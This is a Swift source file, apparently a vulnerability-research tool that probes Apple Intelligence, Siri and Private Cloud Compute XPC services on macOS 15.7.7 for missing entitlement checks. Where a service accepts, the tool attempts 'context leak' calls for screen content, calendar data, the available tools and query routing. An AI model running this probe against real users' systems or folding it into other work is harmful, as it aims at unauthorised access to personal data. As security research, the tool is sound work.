// IntelligenceFlow XPC Probe
// Targets all confirmed Mach service names from intelligenceflowd and intelligencecontextd.
//
// intelligenceflowd = the Apple Intelligence query routing orchestrator.
// It decides: on-device model / PCC / external model (ChatGPT).
// intelligencecontextd = personal context provider (contacts, calendar, screen content).
//
// ANY of these accepting from an unprivileged process is a HIGH severity finding:
//   - orchestrator: force queries to specific model, bypass routing
//   - querydecoration: access personal context (contacts/calendar/messages) WITHOUT entitlement
//   - uiContext: read screen content from any app
//   - snippet-streaming: intercept AI response streams
//   - transcript-entity-querying: read conversation history
//
// All Mach service names confirmed from launchd plist files on macOS 15.7.7.

import Foundation

// Generic XPC protocol — we probe each service with a conservative ping + generic call.
// Once a service name is confirmed to accept, we write a targeted method-specific probe.
@objc protocol IntelligenceFlowXPC: NSObjectProtocol {
    // Generic calls that might exist in routing/context services
    @objc optional func getStatus(_ reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func ping(_ reply: ((Bool, NSError?) -> Void)?)
    @objc optional func getCapabilities(_ reply: ((NSDictionary?, NSError?) -> Void)?)

    // Orchestrator methods (routing)
    @objc optional func routeQuery(_ query: NSDictionary?,
                                    reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func submitQuery(_ query: NSDictionary?,
                                     reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func decorateQuery(_ query: NSDictionary?,
                                       reply: ((NSDictionary?, NSError?) -> Void)?)

    // Context methods (HIGH VALUE: personal data access)
    @objc optional func getContext(_ request: NSDictionary?,
                                    reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func getUIContext(_ reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func getPersonalContext(_ query: NSString?,
                                            reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func getContextIntelligence(_ query: NSDictionary?,
                                                reply: ((NSDictionary?, NSError?) -> Void)?)

    // Streaming
    @objc optional func startStream(_ config: NSDictionary?,
                                     reply: ((NSString?, NSError?) -> Void)?)
    @objc optional func getTranscriptEntities(_ request: NSDictionary?,
                                               reply: ((NSArray?, NSError?) -> Void)?)

    // Toolbox
    @objc optional func getAvailableTools(_ reply: ((NSArray?, NSError?) -> Void)?)
    @objc optional func invokeTool(_ toolName: NSString?,
                                    params: NSDictionary?,
                                    reply: ((NSDictionary?, NSError?) -> Void)?)
}

// All confirmed Mach service names from the plist files
let TARGETS: [(service: String, label: String)] = [
    // intelligenceflowd — query routing and orchestration
    ("com.apple.intelligenceflow.orchestrator",             "orchestrator"),
    ("com.apple.intelligenceflow.querydecoration",          "querydecoration"),
    ("com.apple.intelligenceflow.snippet-streaming",        "snippet-streaming"),
    ("com.apple.intelligenceflow.toolbox",                  "toolbox"),
    ("com.apple.intelligenceflow.transcript-entity-querying", "transcript"),
    ("com.apple.intelligenceflow.internal",                 "internal"),
    // intelligencecontextd — personal context and screen content
    ("com.apple.intelligenceflow.context",                  "context"),
    ("com.apple.intelligenceflow.contextIntelligence",      "contextIntelligence"),
    ("com.apple.intelligenceflow.uiContext",                "uiContext"),
    ("com.apple.uiintelligencesupport.agent",               "uiSupport"),
    // siriinferenced — on-device ML inference
    ("com.apple.siriinferenced",                            "siriinferenced"),
    ("com.apple.siriinferenced.remembers",                  "siri.remembers"),
    ("com.apple.siriinferenced.signals",                    "siri.signals"),
    ("com.apple.sirisuggestions",                           "sirisuggestions"),
    // ospredictiond — system-level intelligence (runs as root)
    ("com.apple.OSIntelligence",                            "OSIntelligence"),
    ("com.apple.OSIntelligence.battery",                    "OSIntelligence.battery"),
    ("com.apple.OSIntelligence.charging",                   "OSIntelligence.charging"),
    // assistantd — Siri assistant (confirmed running PID 528)
    ("com.apple.assistant.client",                          "assistant.client"),
    ("com.apple.assistant.analytics",                       "assistant.analytics"),
    // suggestd — ML-driven suggestions (mail, messages intelligence)
    ("com.apple.suggestd.mail-intelligence",                "suggestd.mail-intelligence"),
    ("com.apple.suggestd.messages",                         "suggestd.messages"),
    ("com.apple.suggestd.mail",                             "suggestd.mail"),
    // modelcatalog — ML model management
    ("com.apple.modelcatalog.subscriptions",                "modelcatalog"),
    // privatecloudcomputed (confirmed running PID 2971)
    ("com.apple.privatecloudcomputed",                      "pcc"),
    ("com.apple.PrivateCloudCompute",                       "PCC"),
    ("com.apple.privatecloudcompute",                       "pcc2"),
]

func probe(service: String, label: String, waitSecs: Int = 4) {
    print("\n--- [\(label)] \(service) ---")
    let conn = NSXPCConnection(machServiceName: service, options: [])
    conn.remoteObjectInterface = NSXPCInterface(with: IntelligenceFlowXPC.self)

    var result = "(pending)"
    let sema = DispatchSemaphore(value: 0)

    conn.invalidationHandler = {
        if result == "(pending)" { result = "INVALIDATED" }
        sema.signal()
    }
    conn.interruptionHandler = {
        if result == "(pending)" { result = "INTERRUPTED (method rejected)" }
        sema.signal()
    }
    conn.resume()

    let proxy = conn.remoteObjectProxyWithErrorHandler { err in
        result = "ERROR: \(err.localizedDescription)"
        sema.signal()
    } as AnyObject

    if let p = proxy as? IntelligenceFlowXPC {
        // Ping first
        p.ping? { _, _ in
            if result == "(pending)" { result = "REPLY: ping accepted — NO ENTITLEMENT CHECK" }
            sema.signal()
        }
    }

    // Timer fallback so we always signal
    DispatchQueue.global().asyncAfter(deadline: .now() + .seconds(waitSecs)) {
        if result == "(pending)" { result = "TIMEOUT (\(waitSecs)s) *** SERVICE ACCEPTED ***" }
        sema.signal()
    }

    _ = sema.wait(timeout: .now() + .seconds(waitSecs + 1))
    print("  RESULT: \(result)")

    // Deep probe if accepted
    if result.contains("TIMEOUT") || result.contains("REPLY") || result.contains("ACCEPTED") {
        print("  *** ACCEPTED — running deep probe ***")

        if let p = proxy as? IntelligenceFlowXPC {
            let s2 = DispatchSemaphore(value: 0)
            var r2 = "(pending)"

            // Context leak attempt — if uiContext or context service, try to get screen content
            p.getUIContext? { resp, _ in
                r2 = "*** UI CONTEXT: \(String(describing: resp)) ***"
                s2.signal()
            }
            p.getPersonalContext?("What are my upcoming calendar events?") { resp, _ in
                if r2 == "(pending)" {
                    r2 = "*** PERSONAL CONTEXT REPLY: \(resp?.count ?? 0) keys ***"
                }
                s2.signal()
            }
            p.getAvailableTools? { tools, _ in
                if r2 == "(pending)" {
                    r2 = "*** TOOLS: \(tools?.count ?? 0) available ***"
                }
                s2.signal()
            }
            p.routeQuery?(["query": "test", "type": "text"] as NSDictionary) { resp, _ in
                if r2 == "(pending)" {
                    r2 = "*** ROUTE REPLY: \(String(describing: resp)) ***"
                }
                s2.signal()
            }
            DispatchQueue.global().asyncAfter(deadline: .now() + 8) { s2.signal() }
            _ = s2.wait(timeout: .now() + 9)
            print("  DEEP PROBE: \(r2)")
        }
    }

    conn.invalidate()
    Thread.sleep(forTimeInterval: 0.8)
}

print("=== IntelligenceFlow + Siri + OSIntelligence XPC Probe ===")
print("PID: \(ProcessInfo.processInfo.processIdentifier)  UID: \(getuid())")
print("All service names confirmed from launchd plist files on macOS 15.7.7")
print("Testing \(TARGETS.count) services...\n")

for (service, label) in TARGETS {
    probe(service: service, label: label)
}

print("\n=== PROBE COMPLETE ===")
print("TIMEOUT/REPLY/ACCEPTED = unprivileged process reached the service.")
print("Check logs: log show --predicate 'process CONTAINS \"intelligence\" OR process CONTAINS \"siri\"' --last 3m")
